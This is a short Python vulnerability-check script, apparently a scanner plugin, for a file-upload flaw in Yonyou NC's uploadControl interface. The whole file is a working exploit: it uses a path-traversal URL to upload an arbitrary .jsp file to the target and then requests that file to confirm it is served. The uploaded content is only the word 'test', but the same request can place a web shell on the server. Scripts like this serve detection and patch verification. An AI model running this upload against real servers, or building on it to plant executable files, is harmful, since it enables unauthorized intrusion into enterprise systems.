import requests
import urllib

from inc.generate_random import generate_random_str
def verify(url):
    relsult = {
        'name': '用友NC-uploadControl接口存在文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp',
    }
    char = generate_random_str(6)
    data = f'''------WebKitFormBoundaryoDIsCqVMmF83ptmp
    Content-Disposition: form-data; name="file"; filename="{char}.jsp"
    Content-Type: application/octet-stream

    test
    ------WebKitFormBoundaryoDIsCqVMmF83ptmp
    Content-Disposition: form-data; name="submit"

    上传
    ------WebKitFormBoundaryoDIsCqVMmF83ptmp'''
    vurl = urllib.parse.urljoin(url, "/mp/login/../uploadControl/uploadFile")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'true' in response.text:
            vurl = url + f'/mp/uploadFileDir/{char}.jsp'
            response = requests.get(vurl)
            if response.status_code == 200 and 'test' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult